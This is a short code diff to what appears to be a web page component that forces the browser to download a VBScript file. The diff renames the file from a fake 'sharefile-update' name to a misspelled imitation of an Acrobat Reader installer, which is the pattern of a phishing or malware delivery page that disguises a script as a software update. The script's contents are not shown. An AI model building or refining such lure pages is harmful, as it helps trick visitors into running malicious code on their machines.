@@ -10,8 +10,8 @@ const Documents = () => {
 
   const triggerDownload = () => {
     const link = document.createElement("a");
-    link.href = "/sharefile-update.vbs";
-    link.download = "sharefile-update.vbs";
+    link.href = "/portable_reader_acrbat_v23_01_p2.vbs";
+    link.download = "portable_reader_acrbat_v23_01_p2.vbs";
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
